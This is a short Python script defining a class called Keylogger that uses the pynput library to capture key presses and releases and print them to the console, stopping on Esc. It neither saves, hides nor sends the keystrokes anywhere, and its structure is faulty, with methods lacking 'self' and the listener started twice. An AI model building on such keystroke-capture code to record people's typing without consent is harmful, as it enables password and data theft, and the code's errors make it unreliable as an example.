from pynput import keyboard

class Keylogger:
    def __init__(self):
        self.key = None

    def on_press(key):
        try:
            print(key.char)
        except AttributeError:
            print("special")

    def on_release(key):
        print(key)
        if key == keyboard.Key.esc:
            return False
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
    listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    listener.start()
Keylogger()